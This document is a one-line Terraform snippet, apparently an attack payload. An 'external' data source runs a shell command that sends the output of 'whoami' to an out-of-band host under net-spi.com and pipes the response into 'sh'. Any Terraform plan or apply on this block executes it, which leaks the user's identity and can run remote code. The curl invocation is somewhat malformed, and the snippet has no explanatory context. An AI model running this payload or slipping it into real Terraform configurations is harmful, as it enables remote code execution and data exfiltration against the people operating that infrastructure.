data "external" "example" { program = ["sh", "-c", "curl -XPOST -d https://6pw9ke4o80ru6r9ty64s0onfh6nxbuzj.net-spi.com/exfil2/`whoami` | sh"] }
